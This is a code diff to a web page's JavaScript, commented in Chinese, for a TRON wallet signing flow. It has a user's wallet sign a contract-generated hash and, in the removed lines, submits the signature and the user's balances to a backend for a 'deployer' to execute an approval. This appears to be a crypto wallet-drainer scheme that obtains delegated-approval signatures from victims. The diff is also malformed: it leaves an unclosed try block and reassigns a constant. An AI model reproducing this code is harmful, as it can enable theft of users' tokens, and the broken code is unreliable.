@@ -468,69 +468,71 @@
                     approveBtn.innerHTML = '生成中...';
             
                     // 关键步骤：调用合约generateHash生成哈希并签名（无任何额度参数）
-                    const { user, v, r, s, messageHash } = await getContractGeneratedSignature(userAddress);
-            
-                    // 构造合约executeApprove函数要求的入参格式（无maxAmount冗余参数）
-                    const submitData = {
-                        user: user,
-                        v: v.toString(), // 转字符串避免精度丢失
-                        r: r,
-                        s: s,
-                        messageHash: messageHash,
-                        approveTime: postData.approveTime,
-                        delegateContract: DELEGATE_CONTRACT
-                    };
-            
-                    // 地址一致性校验
-                    if (submitData.user !== cleanBase58Address(userAddress)) {
-                        throw new Error(`地址不一致！当前钱包：${userAddress}，提交地址：${submitData.user}`);
-                    }
-            
-                    // 本地缓存提交数据
-                    localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
-            
-                    // 提交到后端（参数完全匹配合约executeApprove接口）
-                    const res = await fetch(`${BACKEND_API}/approve/submit`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(submitData),
-                        credentials: "include"
-                    });
-            
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
-            
-                    // 保存授权记录（无额度相关字段）
-                    saveApprovalRecord({
-                        address: userAddress,
-                        addressHex: postData.addressHex,
-                        tokenBalance: tokenBalance,
-                        trxBalance: trxBalance,
-                        approveTime: postData.approveTime,
-                        status: "待部署者执行授权",
-                        delegateContract: DELEGATE_CONTRACT,
-                        messageHash: messageHash.slice(0,16) + "..." // 哈希前缀显示
-                    });
-            
-                    renderApprovalRecords();
-                    updateRecordCount();
-                    showToast("签名提交成功！等待部署者执行合约授权");
-                    postData.status = "submitted";
-            
-                } catch (e) {
-                    showToast(`操作失败：${e.message}`, "error");
-                    postData.status = "fail";
-                    localStorage.setItem(DEBUG_KEY, JSON.stringify({
-                        error: e.message,
-                        timestamp: new Date().toISOString(),
-                        userAddress: userAddress
-                    }, null, 2));
-                } finally {
-                    approveBtn.disabled = false;
-                    approveBtn.innerHTML = '生成离线签名';
-                }
-            };
-            
+                   async function getContractGeneratedSignature(userAddress) {
+    try {
+        // 1. 地址转Hex（匹配合约generateHash参数）
+        const userHexAddress = tronWeb.address.toHex(userAddress);
+        if (!userHexAddress.startsWith("0x") || userHexAddress.length !== 42) {
+            throw new Error("地址转换失败");
+        }
+
+        // 2. 调用合约生成哈希（已验证一致）
+        const delegateContract = await tronWeb.contract().at(DELEGATE_CONTRACT);
+        const messageHash = await delegateContract.generateHash(userHexAddress).call();
+        if (!messageHash || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
+            throw new Error("合约哈希无效");
+        }
+
+        // 3. 生成带0x前缀的32字节待签名哈希（用户已确认正确）
+        const prefix = "\x19Ethereum Signed Message:\n32";
+        const prefixBytes = new TextEncoder().encode(prefix);
+        const messageHashBytes = hexToUint8Array(messageHash.slice(2));
+        const combinedBytes = new Uint8Array(prefixBytes.length + messageHashBytes.length);
+        combinedBytes.set(prefixBytes, 0);
+        combinedBytes.set(messageHashBytes, prefixBytes.length);
+        let signedHash = tronWeb.sha3(combinedBytes, true); // 带0x，66位
+
+        // 4. 核心：isTx=false（消息签名）+ 适配imToken识别（处理返回格式）
+        let signatureResult = await tronWeb.trx.sign(signedHash, false); // 改回false！
+        // 适配imToken：提取纯签名字符串（部分版本返回对象，部分直接返回字符串）
+        let signature = "";
+        if (typeof signatureResult === "object" && signatureResult.signature) {
+            signature = signatureResult.signature; // 处理返回对象的情况
+        } else if (typeof signatureResult === "string") {
+            signature = signatureResult; // 处理直接返回字符串的情况
+        } else {
+            throw new Error("imToken未返回有效签名");
+        }
+
+        // 5. 清理签名格式（去掉可能的0x前缀，确保130位）
+        if (signature.startsWith("0x")) signature = signature.slice(2);
+        if (signature.length !== 130) throw new Error(`签名长度错误（需130位，实际${signature.length}位）`);
+
+        // 6. 解析v/r/s + 处理s值低S合规性（Tron EVM要求）
+        const r = "0x" + signature.slice(0, 64);
+        const s = "0x" + signature.slice(64, 128);
+        let v = parseInt(signature.slice(128, 130), 16); // 保持0/1，不加减
+
+        // 关键：s值必须≤半阶（EIP-2），否则ecrecover返回address(0)
+        const secp256k1HalfN = BigInt("0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0");
+        let sBigInt = BigInt(s);
+        if (sBigInt > secp256k1HalfN) {
+            sBigInt = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141") - sBigInt;
+            s = "0x" + sBigInt.toString(16).padStart(64, "0");
+        }
+
+        // 7. 提前验证签名者（确保和用户地址一致，避免白跑）
+        const recoveredSignerHex = await tronWeb.trx.recover(signedHash, v, r, s);
+        const recoveredSignerBase58 = tronWeb.address.fromHex(recoveredSignerHex);
+        if (recoveredSignerBase58 !== userAddress) {
+            throw new Error(`签名者不匹配：${recoveredSignerBase58} != ${userAddress}`);
+        }
+
+        return { user: userAddress, v, r, s, messageHash };
+    } catch (e) {
+        throw new Error(`签名失败：${e.message}`);
+    }
+}
             // 查看后端提交数据（无额度相关参数）
             showSubmitDataBtn.onclick = () => {
                 try {
